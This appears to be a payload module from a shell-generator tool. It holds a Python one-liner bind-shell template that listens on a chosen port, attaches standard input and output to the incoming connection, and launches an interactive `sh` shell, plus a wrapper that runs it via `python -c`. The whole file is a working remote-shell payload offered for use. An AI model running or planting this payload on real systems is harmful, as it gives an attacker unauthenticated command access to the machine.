USAGE = 'port'
NARGS = [1, 1]
LANG = 'py'
EXEC = '''
python -c "PAYLOAD"
'''

pl = '''
import os,socket,subprocess;VAR1=socket.socket();VAR1.bind(('',ARG1));VAR1.listen();VAR2,_=VAR1.accept();[os.dup2(VAR2.fileno(),i) for i in [0,1,2]];subprocess.call(['sh','-i'])
'''
